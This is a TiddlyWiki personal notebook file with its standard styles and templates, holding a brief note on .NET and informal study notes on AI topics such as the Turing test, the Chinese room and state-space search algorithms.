<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<script type="text/javascript">
//<![CDATA[
var version = {title: "TiddlyWiki", major: 2, minor: 2, revision: 4, date: new Date("Jun 19, 2007"), extensions: {}};
//]]>
</script>
<!--
TiddlyWiki created by Jeremy Ruston, (jeremy [at] osmosoft [dot] com)

Copyright (c) UnaMesa Association 2004-2007

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

Redistributions of source code must retain the above copyright notice, this
list of conditions and the following disclaimer.

Redistributions in binary form must reproduce the above copyright notice, this
list of conditions and the following disclaimer in the documentation and/or other
materials provided with the distribution.

Neither the name of the UnaMesa Association nor the names of its contributors may be
used to endorse or promote products derived from this software without specific
prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY
EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT
SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR
BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH
DAMAGE.
-->
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<!--PRE-HEAD-START-->
<!--{{{-->
<link rel='alternate' type='application/rss+xml' title='RSS' href='index.xml'/>
<!--}}}-->
<!--PRE-HEAD-END-->
<title> My TiddlyWiki - a reusable non-linear personal web notebook </title>
<style type="text/css">
#saveTest {display:none;}
#messageArea {display:none;}
#copyright {display:none;}
#storeArea {display:none;}
#storeArea div {padding:0.5em; margin:1em 0em 0em 0em; border-color:#fff #666 #444 #ddd; border-style:solid; border-width:2px; overflow:auto;}
#shadowArea {display:none;}
#javascriptWarning {width:100%; text-align:center; font-weight:bold; background-color:#dd1100; color:#fff; padding:1em 0em;}
</style>
<!--POST-HEAD-START-->

<!--POST-HEAD-END-->
</head>
<body onload="main();" onunload="if(window.checkUnsavedChanges) checkUnsavedChanges(); if(window.scrubNodes) scrubNodes(document.body);">
<!--PRE-BODY-START-->

<!--PRE-BODY-END-->
<div id="copyright">
Welcome to TiddlyWiki created by Jeremy Ruston, Copyright &copy; 2007 UnaMesa Association
</div>
<noscript>
	<div id="javascriptWarning">This page requires JavaScript to function properly.<br /><br />If you are using Microsoft Internet Explorer you may need to click on the yellow bar above and select 'Allow Blocked Content'. You must then click 'Yes' on the following security warning.</div>
</noscript>
<div id="saveTest"></div>
<div id="backstageCloak"></div>
<div id="backstageButton"></div>
<div id="backstageArea"><div id="backstageToolbar"></div></div>
<div id="backstage">
	<div id="backstagePanel"></div>
</div>
<div id="contentWrapper"></div>
<div id="contentStash"></div>
<div id="shadowArea">
<div title="ColorPalette">
<pre>Background: #fff
Foreground: #000
PrimaryPale: #8cf
PrimaryLight: #18f
PrimaryMid: #04b
PrimaryDark: #014
SecondaryPale: #ffc
SecondaryLight: #fe8
SecondaryMid: #db4
SecondaryDark: #841
TertiaryPale: #eee
TertiaryLight: #ccc
TertiaryMid: #999
TertiaryDark: #666
Error: #f88</pre>
</div>
<div title="StyleSheetColors">
<pre>/*{{{*/
body {background:[[ColorPalette::Background]]; color:[[ColorPalette::Foreground]];}

a {color:[[ColorPalette::PrimaryMid]];}
a:hover {background-color:[[ColorPalette::PrimaryMid]]; color:[[ColorPalette::Background]];}
a img {border:0;}

h1,h2,h3,h4,h5,h6 {color:[[ColorPalette::SecondaryDark]]; background:transparent;}
h1 {border-bottom:2px solid [[ColorPalette::TertiaryLight]];}
h2,h3 {border-bottom:1px solid [[ColorPalette::TertiaryLight]];}

.button {color:[[ColorPalette::PrimaryDark]]; border:1px solid [[ColorPalette::Background]];}
.button:hover {color:[[ColorPalette::PrimaryDark]]; background:[[ColorPalette::SecondaryLight]]; border-color:[[ColorPalette::SecondaryMid]];}
.button:active {color:[[ColorPalette::Background]]; background:[[ColorPalette::SecondaryMid]]; border:1px solid [[ColorPalette::SecondaryDark]];}

.header {background:[[ColorPalette::PrimaryMid]];}
.headerShadow {color:[[ColorPalette::Foreground]];}
.headerShadow a {font-weight:normal; color:[[ColorPalette::Foreground]];}
.headerForeground {color:[[ColorPalette::Background]];}
.headerForeground a {font-weight:normal; color:[[ColorPalette::PrimaryPale]];}

.tabSelected{color:[[ColorPalette::PrimaryDark]];
	background:[[ColorPalette::TertiaryPale]];
	border-left:1px solid [[ColorPalette::TertiaryLight]];
	border-top:1px solid [[ColorPalette::TertiaryLight]];
	border-right:1px solid [[ColorPalette::TertiaryLight]];
}
.tabUnselected {color:[[ColorPalette::Background]]; background:[[ColorPalette::TertiaryMid]];}
.tabContents {color:[[ColorPalette::PrimaryDark]]; background:[[ColorPalette::TertiaryPale]]; border:1px solid [[ColorPalette::TertiaryLight]];}
.tabContents .button {border:0;}

#sidebar {}
#sidebarOptions input {border:1px solid [[ColorPalette::PrimaryMid]];}
#sidebarOptions .sliderPanel {background:[[ColorPalette::PrimaryPale]];}
#sidebarOptions .sliderPanel a {border:none;color:[[ColorPalette::PrimaryMid]];}
#sidebarOptions .sliderPanel a:hover {color:[[ColorPalette::Background]]; background:[[ColorPalette::PrimaryMid]];}
#sidebarOptions .sliderPanel a:active {color:[[ColorPalette::PrimaryMid]]; background:[[ColorPalette::Background]];}

.wizard {background:[[ColorPalette::PrimaryPale]]; border:1px solid [[ColorPalette::PrimaryMid]];}
.wizard h1 {color:[[ColorPalette::PrimaryDark]]; border:none;}
.wizard h2 {color:[[ColorPalette::Foreground]]; border:none;}
.wizardStep {background:[[ColorPalette::Background]]; color:[[ColorPalette::Foreground]];
	border:1px solid [[ColorPalette::PrimaryMid]];}
.wizardStep.wizardStepDone {background::[[ColorPalette::TertiaryLight]];}
.wizardFooter {background:[[ColorPalette::PrimaryPale]];}
.wizardFooter .status {background:[[ColorPalette::PrimaryDark]]; color:[[ColorPalette::Background]];}
.wizard .button {color:[[ColorPalette::Foreground]]; background:[[ColorPalette::SecondaryLight]]; border: 1px solid;
	border-color:[[ColorPalette::SecondaryPale]] [[ColorPalette::SecondaryDark]] [[ColorPalette::SecondaryDark]] [[ColorPalette::SecondaryPale]];}
.wizard .button:hover {color:[[ColorPalette::Foreground]]; background:[[ColorPalette::Background]];}
.wizard .button:active {color:[[ColorPalette::Background]]; background:[[ColorPalette::Foreground]]; border: 1px solid;
	border-color:[[ColorPalette::PrimaryDark]] [[ColorPalette::PrimaryPale]] [[ColorPalette::PrimaryPale]] [[ColorPalette::PrimaryDark]];}

#messageArea {border:1px solid [[ColorPalette::SecondaryMid]]; background:[[ColorPalette::SecondaryLight]]; color:[[ColorPalette::Foreground]];}
#messageArea .button {color:[[ColorPalette::PrimaryMid]]; background:[[ColorPalette::SecondaryPale]]; border:none;}

.popupTiddler {background:[[ColorPalette::TertiaryPale]]; border:2px solid [[ColorPalette::TertiaryMid]];}

.popup {background:[[ColorPalette::TertiaryPale]]; color:[[ColorPalette::TertiaryDark]]; border-left:1px solid [[ColorPalette::TertiaryMid]]; border-top:1px solid [[ColorPalette::TertiaryMid]]; border-right:2px solid [[ColorPalette::TertiaryDark]]; border-bottom:2px solid [[ColorPalette::TertiaryDark]];}
.popup hr {color:[[ColorPalette::PrimaryDark]]; background:[[ColorPalette::PrimaryDark]]; border-bottom:1px;}
.popup li.disabled {color:[[ColorPalette::TertiaryMid]];}
.popup li a, .popup li a:visited {color:[[ColorPalette::Foreground]]; border: none;}
.popup li a:hover {background:[[ColorPalette::SecondaryLight]]; color:[[ColorPalette::Foreground]]; border: none;}
.popup li a:active {background:[[ColorPalette::SecondaryPale]]; color:[[ColorPalette::Foreground]]; border: none;}
.popupHighlight {background:[[ColorPalette::Background]]; color:[[ColorPalette::Foreground]];}
.listBreak div {border-bottom:1px solid [[ColorPalette::TertiaryDark]];}

.tiddler .defaultCommand {font-weight:bold;}

.shadow .title {color:[[ColorPalette::TertiaryDark]];}

.title {color:[[ColorPalette::SecondaryDark]];}
.subtitle {color:[[ColorPalette::TertiaryDark]];}

.toolbar {color:[[ColorPalette::PrimaryMid]];}
.toolbar a {color:[[ColorPalette::TertiaryLight]];}
.selected .toolbar a {color:[[ColorPalette::TertiaryMid]];}
.selected .toolbar a:hover {color:[[ColorPalette::Foreground]];}

.tagging, .tagged {border:1px solid [[ColorPalette::TertiaryPale]]; background-color:[[ColorPalette::TertiaryPale]];}
.selected .tagging, .selected .tagged {background-color:[[ColorPalette::TertiaryLight]]; border:1px solid [[ColorPalette::TertiaryMid]];}
.tagging .listTitle, .tagged .listTitle {color:[[ColorPalette::PrimaryDark]];}
.tagging .button, .tagged .button {border:none;}

.footer {color:[[ColorPalette::TertiaryLight]];}
.selected .footer {color:[[ColorPalette::TertiaryMid]];}

.sparkline {background:[[ColorPalette::PrimaryPale]]; border:0;}
.sparktick {background:[[ColorPalette::PrimaryDark]];}

.error, .errorButton {color:[[ColorPalette::Foreground]]; background:[[ColorPalette::Error]];}
.warning {color:[[ColorPalette::Foreground]]; background:[[ColorPalette::SecondaryPale]];}
.lowlight {background:[[ColorPalette::TertiaryLight]];}

.zoomer {background:none; color:[[ColorPalette::TertiaryMid]]; border:3px solid [[ColorPalette::TertiaryMid]];}

.imageLink, #displayArea .imageLink {background:transparent;}

.annotation {background:[[ColorPalette::SecondaryLight]]; color:[[ColorPalette::Foreground]]; border:2px solid [[ColorPalette::SecondaryMid]];}

.viewer .listTitle {list-style-type:none; margin-left:-2em;}
.viewer .button {border:1px solid [[ColorPalette::SecondaryMid]];}
.viewer blockquote {border-left:3px solid [[ColorPalette::TertiaryDark]];}

.viewer table, table.twtable {border:2px solid [[ColorPalette::TertiaryDark]];}
.viewer th, .viewer thead td, .twtable th, .twtable thead td {background:[[ColorPalette::SecondaryMid]]; border:1px solid [[ColorPalette::TertiaryDark]]; color:[[ColorPalette::Background]];}
.viewer td, .viewer tr, .twtable td, .twtable tr {border:1px solid [[ColorPalette::TertiaryDark]];}

.viewer pre {border:1px solid [[ColorPalette::SecondaryLight]]; background:[[ColorPalette::SecondaryPale]];}
.viewer code {color:[[ColorPalette::SecondaryDark]];}
.viewer hr {border:0; border-top:dashed 1px [[ColorPalette::TertiaryDark]]; color:[[ColorPalette::TertiaryDark]];}

.highlight, .marked {background:[[ColorPalette::SecondaryLight]];}

.editor input {border:1px solid [[ColorPalette::PrimaryMid]];}
.editor textarea {border:1px solid [[ColorPalette::PrimaryMid]]; width:100%;}
.editorFooter {color:[[ColorPalette::TertiaryMid]];}

#backstageArea {background:[[ColorPalette::Foreground]]; color:[[ColorPalette::TertiaryMid]];}
#backstageArea a {background:[[ColorPalette::Foreground]]; color:[[ColorPalette::Background]]; border:none;}
#backstageArea a:hover {background:[[ColorPalette::SecondaryLight]]; color:[[ColorPalette::Foreground]]; }
#backstageArea a.backstageSelTab {background:[[ColorPalette::Background]]; color:[[ColorPalette::Foreground]];}
#backstageButton a {background:none; color:[[ColorPalette::Background]]; border:none;}
#backstageButton a:hover {background:[[ColorPalette::Foreground]]; color:[[ColorPalette::Background]]; border:none;}
#backstagePanel {background:[[ColorPalette::Background]]; border-color: [[ColorPalette::Background]] [[ColorPalette::TertiaryDark]] [[ColorPalette::TertiaryDark]] [[ColorPalette::TertiaryDark]];}
.backstagePanelFooter .button {border:none; color:[[ColorPalette::Background]];}
.backstagePanelFooter .button:hover {color:[[ColorPalette::Foreground]];}
#backstageCloak {background:[[ColorPalette::Foreground]]; opacity:0.6; filter:'alpha(opacity:60)';}
/*}}}*/</pre>
</div>
<div title="StyleSheetLayout">
<pre>/*{{{*/
* html .tiddler {height:1%;}

body {font-size:.75em; font-family:arial,helvetica; margin:0; padding:0;}

h1,h2,h3,h4,h5,h6 {font-weight:bold; text-decoration:none;}
h1,h2,h3 {padding-bottom:1px; margin-top:1.2em;margin-bottom:0.3em;}
h4,h5,h6 {margin-top:1em;}
h1 {font-size:1.35em;}
h2 {font-size:1.25em;}
h3 {font-size:1.1em;}
h4 {font-size:1em;}
h5 {font-size:.9em;}

hr {height:1px;}

a {text-decoration:none;}

dt {font-weight:bold;}

ol {list-style-type:decimal;}
ol ol {list-style-type:lower-alpha;}
ol ol ol {list-style-type:lower-roman;}
ol ol ol ol {list-style-type:decimal;}
ol ol ol ol ol {list-style-type:lower-alpha;}
ol ol ol ol ol ol {list-style-type:lower-roman;}
ol ol ol ol ol ol ol {list-style-type:decimal;}

.txtOptionInput {width:11em;}

#contentWrapper .chkOptionInput {border:0;}

.externalLink {text-decoration:underline;}

.indent {margin-left:3em;}
.outdent {margin-left:3em; text-indent:-3em;}
code.escaped {white-space:nowrap;}

.tiddlyLinkExisting {font-weight:bold;}
.tiddlyLinkNonExisting {font-style:italic;}

/* the 'a' is required for IE, otherwise it renders the whole tiddler in bold */
a.tiddlyLinkNonExisting.shadow {font-weight:bold;}

#mainMenu .tiddlyLinkExisting,
	#mainMenu .tiddlyLinkNonExisting,
	#sidebarTabs .tiddlyLinkNonExisting {font-weight:normal; font-style:normal;}
#sidebarTabs .tiddlyLinkExisting {font-weight:bold; font-style:normal;}

.header {position:relative;}
.header a:hover {background:transparent;}
.headerShadow {position:relative; padding:4.5em 0em 1em 1em; left:-1px; top:-1px;}
.headerForeground {position:absolute; padding:4.5em 0em 1em 1em; left:0px; top:0px;}

.siteTitle {font-size:3em;}
.siteSubtitle {font-size:1.2em;}

#mainMenu {position:absolute; left:0; width:11em; text-align:right; line-height:1.5em; padding:0.5em 0.2em 0.2em 0.5em; font-size:1em;}

#sidebar {position:absolute; right:2px; width:16em; font-size:.9em;}
#sidebarOptions {padding-top:0.3em;}
#sidebarOptions a {margin:0em 0.2em; padding:0.2em 0.3em; display:block;}
#sidebarOptions input {margin:0.2em 0.2em;}
#sidebarOptions .sliderPanel {margin-left:1em; padding:0.5em; font-size:.85em;}
#sidebarOptions .sliderPanel a {font-weight:bold; display:inline; padding:0;}
#sidebarOptions .sliderPanel input {margin:0 0 .3em 0;}
#sidebarTabs .tabContents {width:15em; overflow:hidden;}

.wizard {padding:0.1em 1em 0em 2em;}
.wizard h1 {font-size:2em; font-weight:bold; background:none; padding:0em 0em 0em 0em; margin:0.4em 0em 0.2em 0em;}
.wizard h2 {font-size:1.2em; font-weight:bold; background:none; padding:0em 0em 0em 0em; margin:0.4em 0em 0.2em 0em;}
.wizardStep {padding:1em 1em 1em 1em;}
.wizard .button {margin:0.5em 0em 0em 0em; font-size:1.2em;}
.wizardFooter {padding:0.8em 0.4em 0.8em 0em;}
.wizardFooter .status {padding:0em 0.4em 0em 0.4em; margin-left:1em;}
.wizard .button {padding:0.1em 0.2em 0.1em 0.2em;}

#messageArea {position:fixed; top:2em; right:0em; margin:0.5em; padding:0.5em; z-index:2000; _position:absolute;}
.messageToolbar {display:block; text-align:right; padding:0.2em 0.2em 0.2em 0.2em;}
#messageArea a {text-decoration:underline;}

.tiddlerPopupButton {padding:0.2em 0.2em 0.2em 0.2em;}
.popupTiddler {position: absolute; z-index:300; padding:1em 1em 1em 1em; margin:0;}

.popup {position:absolute; z-index:300; font-size:.9em; padding:0; list-style:none; margin:0;}
.popup .popupMessage {padding:0.4em;}
.popup hr {display:block; height:1px; width:auto; padding:0; margin:0.2em 0em;}
.popup li.disabled {padding:0.4em;}
.popup li a {display:block; padding:0.4em; font-weight:normal; cursor:pointer;}
.listBreak {font-size:1px; line-height:1px;}
.listBreak div {margin:2px 0;}

.tabset {padding:1em 0em 0em 0.5em;}
.tab {margin:0em 0em 0em 0.25em; padding:2px;}
.tabContents {padding:0.5em;}
.tabContents ul, .tabContents ol {margin:0; padding:0;}
.txtMainTab .tabContents li {list-style:none;}
.tabContents li.listLink { margin-left:.75em;}

#contentWrapper {display:block;}
#splashScreen {display:none;}

#displayArea {margin:1em 17em 0em 14em;}

.toolbar {text-align:right; font-size:.9em;}

.tiddler {padding:1em 1em 0em 1em;}

.missing .viewer,.missing .title {font-style:italic;}

.title {font-size:1.6em; font-weight:bold;}

.missing .subtitle {display:none;}
.subtitle {font-size:1.1em;}

.tiddler .button {padding:0.2em 0.4em;}

.tagging {margin:0.5em 0.5em 0.5em 0; float:left; display:none;}
.isTag .tagging {display:block;}
.tagged {margin:0.5em; float:right;}
.tagging, .tagged {font-size:0.9em; padding:0.25em;}
.tagging ul, .tagged ul {list-style:none; margin:0.25em; padding:0;}
.tagClear {clear:both;}

.footer {font-size:.9em;}
.footer li {display:inline;}

.annotation {padding:0.5em; margin:0.5em;}

* html .viewer pre {width:99%; padding:0 0 1em 0;}
.viewer {line-height:1.4em; padding-top:0.5em;}
.viewer .button {margin:0em 0.25em; padding:0em 0.25em;}
.viewer blockquote {line-height:1.5em; padding-left:0.8em;margin-left:2.5em;}
.viewer ul, .viewer ol {margin-left:0.5em; padding-left:1.5em;}

.viewer table, table.twtable {border-collapse:collapse; margin:0.8em 1.0em;}
.viewer th, .viewer td, .viewer tr,.viewer caption,.twtable th, .twtable td, .twtable tr,.twtable caption {padding:3px;}
table.listView {font-size:0.85em; margin:0.5em 1.0em;}
table.listView th, table.listView td, table.listView tr {padding:0px 3px 0px 3px;}

.viewer pre {padding:0.5em; margin-left:0.3em; font-size:1.2em; line-height:1.4em; overflow:auto;}
.viewer code {font-size:1.2em; line-height:1.4em;}

.editor {font-size:1em;}
.editor input, .editor textarea {display:block; width:100%; font:inherit;}
.editorFooter {padding:0.25em 0em; font-size:.9em;}
.editorFooter .button {padding-top:0px; padding-bottom:0px;}

.fieldsetFix {border:0; padding:0; margin:1px 0px 1px 0px;}

.sparkline {line-height:1em;}
.sparktick {outline:0;}

.zoomer {font-size:1.1em; position:absolute; overflow:hidden;}
.zoomer div {padding:1em;}

* html #backstage {width:99%;}
* html #backstageArea {width:99%;}
#backstageArea {display:none; position:relative; overflow: hidden; z-index:150; padding:0.3em 0.5em 0.3em 0.5em;}
#backstageToolbar {position:relative;}
#backstageArea a {font-weight:bold; margin-left:0.5em; padding:0.3em 0.5em 0.3em 0.5em;}
#backstageButton {display:none; position:absolute; z-index:175; top:0em; right:0em;}
#backstageButton a {padding:0.1em 0.4em 0.1em 0.4em; margin:0.1em 0.1em 0.1em 0.1em;}
#backstage {position:relative; width:100%; z-index:50;}
#backstagePanel {display:none; z-index:100; position:absolute; margin:0em 3em 0em 3em; padding:1em 1em 1em 1em;}
.backstagePanelFooter {padding-top:0.2em; float:right;}
.backstagePanelFooter a {padding:0.2em 0.4em 0.2em 0.4em;}
#backstageCloak {display:none; z-index:20; position:absolute; width:100%; height:100px;}

.whenBackstage {display:none;}
.backstageVisible .whenBackstage {display:block;}
/*}}}*/</pre>
</div>
<div title="StyleSheetLocale">
<pre>/***
StyleSheet for use when a translation requires any css style changes.
This StyleSheet can be used directly by languages such as Chinese, Japanese and Korean which use a logographic writing system and need larger font sizes.
***/

/*{{{*/
body {font-size:0.8em;}

#sidebarOptions {font-size:1.05em;}
#sidebarOptions a {font-style:normal;}
#sidebarOptions .sliderPanel {font-size:0.95em;}

.subtitle {font-size:0.8em;}

.viewer table.listView {font-size:0.95em;}

.htmlarea .toolbarHA table {border:1px solid ButtonFace; margin:0em 0em;}
/*}}}*/</pre>
</div>
<div title="StyleSheetPrint">
<pre>/*{{{*/
@media print {
#mainMenu, #sidebar, #messageArea, .toolbar, #backstageButton {display: none ! important;}
#displayArea {margin: 0.5em 0.5em 0em 0.5em;}
/* Fixes a feature in Firefox 1.5.0.2 where print preview displays the noscript content */
noscript {display:none;}
}
/*}}}*/</pre>
</div>
<div title="PageTemplate">
<pre>&lt;!--{{{--&gt;
&lt;div class='header' macro='gradient vert [[ColorPalette::PrimaryLight]] [[ColorPalette::PrimaryMid]]'&gt;
&lt;div class='headerShadow'&gt;
&lt;span class='siteTitle' refresh='content' tiddler='SiteTitle'&gt;&lt;/span&gt;&amp;nbsp;
&lt;span class='siteSubtitle' refresh='content' tiddler='SiteSubtitle'&gt;&lt;/span&gt;
&lt;/div&gt;
&lt;div class='headerForeground'&gt;
&lt;span class='siteTitle' refresh='content' tiddler='SiteTitle'&gt;&lt;/span&gt;&amp;nbsp;
&lt;span class='siteSubtitle' refresh='content' tiddler='SiteSubtitle'&gt;&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id='mainMenu' refresh='content' tiddler='MainMenu'&gt;&lt;/div&gt;
&lt;div id='sidebar'&gt;
&lt;div id='sidebarOptions' refresh='content' tiddler='SideBarOptions'&gt;&lt;/div&gt;
&lt;div id='sidebarTabs' refresh='content' force='true' tiddler='SideBarTabs'&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div id='displayArea'&gt;
&lt;div id='messageArea'&gt;&lt;/div&gt;
&lt;div id='tiddlerDisplay'&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;!--}}}--&gt;</pre>
</div>
<div title="ViewTemplate">
<pre>&lt;!--{{{--&gt;
&lt;div class='toolbar' macro='toolbar closeTiddler closeOthers +editTiddler &gt; fields syncing permalink references jump'&gt;&lt;/div&gt;
&lt;div class='title' macro='view title'&gt;&lt;/div&gt;
&lt;div class='subtitle'&gt;&lt;span macro='view modifier link'&gt;&lt;/span&gt;, &lt;span macro='view modified date'&gt;&lt;/span&gt; (&lt;span macro='message views.wikified.createdPrompt'&gt;&lt;/span&gt; &lt;span macro='view created date'&gt;&lt;/span&gt;)&lt;/div&gt;
&lt;div class='tagging' macro='tagging'&gt;&lt;/div&gt;
&lt;div class='tagged' macro='tags'&gt;&lt;/div&gt;
&lt;div class='viewer' macro='view text wikified'&gt;&lt;/div&gt;
&lt;div class='tagClear'&gt;&lt;/div&gt;
&lt;!--}}}--&gt;</pre>
</div>
<div title="EditTemplate">
<pre>&lt;!--{{{--&gt;
&lt;div class='toolbar' macro='toolbar +saveTiddler -cancelTiddler deleteTiddler'&gt;&lt;/div&gt;
&lt;div class='title' macro='view title'&gt;&lt;/div&gt;
&lt;div class='editor' macro='edit title'&gt;&lt;/div&gt;
&lt;div macro='annotations'&gt;&lt;/div&gt;
&lt;div class='editor' macro='edit text'&gt;&lt;/div&gt;
&lt;div class='editor' macro='edit tags'&gt;&lt;/div&gt;&lt;div class='editorFooter'&gt;&lt;span macro='message views.editor.tagPrompt'&gt;&lt;/span&gt;&lt;span macro='tagChooser'&gt;&lt;/span&gt;&lt;/div&gt;
&lt;!--}}}--&gt;</pre>
</div>
<div title="GettingStarted">
<pre>To get started with this blank TiddlyWiki, you'll need to modify the following tiddlers:
* SiteTitle &amp; SiteSubtitle: The title and subtitle of the site, as shown above (after saving, they will also appear in the browser title bar)
* MainMenu: The menu (usually on the left)
* DefaultTiddlers: Contains the names of the tiddlers that you want to appear when the TiddlyWiki is opened
You'll also need to enter your username for signing your edits: &lt;&lt;option txtUserName&gt;&gt;</pre>
</div>
<div title="OptionsPanel">
<pre>These InterfaceOptions for customising TiddlyWiki are saved in your browser

Your username for signing your edits. Write it as a WikiWord (eg JoeBloggs)

&lt;&lt;option txtUserName&gt;&gt;
&lt;&lt;option chkSaveBackups&gt;&gt; SaveBackups
&lt;&lt;option chkAutoSave&gt;&gt; AutoSave
&lt;&lt;option chkRegExpSearch&gt;&gt; RegExpSearch
&lt;&lt;option chkCaseSensitiveSearch&gt;&gt; CaseSensitiveSearch
&lt;&lt;option chkAnimate&gt;&gt; EnableAnimations

----
Also see AdvancedOptions</pre>
</div>
</div>
<!--POST-SHADOWAREA-->
<div id="storeArea">
<div title=".Net" modifier="BhargavaKancherla" modified="200807151012" created="200807151011" changecount="2">
<pre>The .NET Framework is a development and execution environment that allows different programming languages &amp; libraries to work together seamlessly to create Windowsbased
applications that are easier to build, manage, deploy, and integrate with other networked systems.

Example: a VB.net class can be simply be extended in other applications such as C# or Visuaal C++.

!.net
Gets ''rid of COM regristy and plumbing code''. Also gets rid of registry foot print.

</pre>
</div>
<div title="AI" modifier="YourName" modified="200810161613" created="200810161539" changecount="11">
<pre>!Turing Test (1950)

The computer is interrogated by a human via a teletype, it passes the test if the human cannot tell if its a computer or a human at the other end. 

!Chinese Room Argument
In the chinese argument model there is a operator sitting in a room and isolated from outside world. The operator has with him a translation book, which allows him to lookup any incoming chinese messages and responds with the corresponding reply message in the book which is also in chinsese. To the outisde world it looks as if the operator understands chinese. 
But the operator does not understand the semantics of the language. 

!AI has
* Automated Problem Solving
* Machine Learning 
* Logic and Deduction
* Computer Vision
* Natural Language Processing (NLP)
* Robotics

!Godel's Incompleteness Theorem (1931)
In any language expressive enough to describe the properties of natural numbers, there are true statements that any undecidable, that is their truth cannot be established by any algorithm.

!Church-Turing Thesis (1936)
The Turing machines is capable of computing any computable function. This is the accepted definition of computability. 

!How to prove NP
A problem is NP , if there are any NP problems which can be translated into the given problem, then if the given problem can be solved in polynomial time then the NP problem can also be solved in polynomial time. 

!Problem solving by search

!!State space search
Here a real world problem is converted into a state space, and then state space algorithms can search in this space. 

2 state space alogrithms
* Uninformed / Blind search - no domain knowledge
* Informed / Heuristic search 

!!Problem Reduction Search
Given problem is divided into sub-problems which are then solved. 

!!Game tree search
Used for searching in game-trees like chess.


!State space search
The basic serach problem is defined as
* given 4-tuple [S,s,O,G] where
** S is the set of state
** s is the start state
** O is the set of transition operators
** G is the set of goal state
* Goal is to find a sequence of stat transistions leading from state start ''s'' to a goal state. 

!!8-puzzle problem
We have a figure like below
{{{
 _____ _____ _____
|     |     |     |
|  8  |  5  |  3  |
|_____|_____|_____|
|     |     |     |
|  7  |  4  |  2  |
|_____|_____|_____|
|     |     |     |
|  6  |     |  1  |
|_____|_____|_____|
}}}

8 squares in the figure is filled with 8 numbers(1-8) in different order. The goal of the problem is to sort them into sequential order, by moving the numbers into the empty square. Only left,right,top and bottom transistions can be made. The final result should be

{{{
 _____ _____ _____
|     |     |     |
|  1  |  2  |  3  |
|_____|_____|_____|
|     |     |     |
|  4  |  5  |  6  |
|_____|_____|_____|
|     |     |     |
|  7  |  8  |     |
|_____|_____|_____|
}}}

The state description for this problem
* S = location of each of the eight numbered tiles and the blank tile
The start state is 
* The starting configuration given
Operators allowed are
* Four operators, for moving blank left,right,up or down.
The goal state is
* G = one or more goal configurations given

Similarly we can define for 15-puzzle, 24-puzzle ... x^^2^^-1 puzzle

!!8-queens problem
The problem is to place 8-queens on a chess board, so that none attacks the other. 

!!!!Problem Forumulation - I
The state description is 
* A state is any arrangement of 0 to 8 queens on board.
Operators allowed are
* Operators add a queen to any square


!!!!Problem Formulation - II
The state description is 
* A state is any arrangement of 0 to 8 queens on board.
Operators allowed are
* Operators add a queen in the left-most empty column, in a way that the queens do not attack each other. 


!!!!Problem Formulation - II
The state description is 
* A state is any arrangement of 0 to 8 queens on board.
Operators allowed are
* Operators move an attacked queen to another square in the same column. 


!!Missinaries and Cannibals
There are 3 missionaries and 3 cannibals on one side of a river, along with a boat that can hold one or two people. Find a way to get everyone to the other side, without ever leaving a group of missionaries outnumbered by cannibals. 

The problem formulation for this problem is
* A state is defined (#m, #c, 1/0)
** #m: number of missionaries in the first bank
** #c: number of cannibals in the first bank
** The last bit indicates whether the boat is in the first bank
* The start state is defined as (3,3,0)
* The goal state is defined as (0,0,0)
* Operators allowed are
** Boat entries (1,0) or (0,1) or (1,1) or (2,0) or (0,2)


!!Basic Search algorithm
# Iniitalise : Set OPEN = {s}
# Fail: If OPEN ={}, terminate with failure
# Select : Select a state, n, from OPEN
# Teminate : If n //belongs to// G, terminate with success
# Expand : Generate the successors of n using O and insert them in OPEN
# Loop : Go to step 2

If OPEN is a stack then we have DFS (depth-first-search). 
If OPEN is a queue then we have BFS (breadth-first-search).

If the size of state space is very large, then DFS might take more time than BFS. 
If the size of state space is inifinite, then DFS might not even terminate. 

!!!Complexity
* b: branching factor       d: depth of the goal      m: depth of the state space tree
* Breadth-first search:
** Time: 1 + b + b^^2^^ + ... + b^^d^^ = O(b^^d^^)
** Space : O(b^^d^^)
* Breadth-first search
** Time: O(b^^m^^)
** Space : O(bm)

!!!Iterative deepening
* Perform DFS repeatedly using increasing depth bounds. 

!!!Bi-directional serach
This is possible only if the operators are reversible. The search starts from the top and bottom, the result will be place where both places merge. 

!!!Basic Search Algorithm with the explicit space
# Iniitalise : Set OPEN = {s}
# Fail: If OPEN ={}, terminate with failure
# Select : Select a state, n, from OPEN ''and save n in CLOSED''
# Teminate : If n //belongs to// G, terminate with success
# Expand : Generate the successors of n using O and insert them in OPEN ''if the successor m //does not belong to// [OPEN //U// CLOSED]''
# Loop : Go to step 2

!!!Basic Search Alogrithm with explicit space and ost search 
# Iniitalise : Set OPEN = {s},
		   CLOSED = {},       
		   ''C(s) = 0''
# Fail: If OPEN ={}, Terminate with failure
# Select : ''Select the minimum cost state'', n, from OPEN and save n in CLOSED
# Teminate : If n //belongs to// G, terminate with success
# Expand : Generate the successors of n using O 
* For each successor, m:
** if m //does not belong to // [OPEN //U// CLOSED]
*** ''Set C(m) = C(n) + C(n,m)'' and insert m in OPEN 
** if m //belongs to // [OPEN //U// CLOSED]
*** ''Set C(m) = min(C(m), C(n) + C(n,m))''
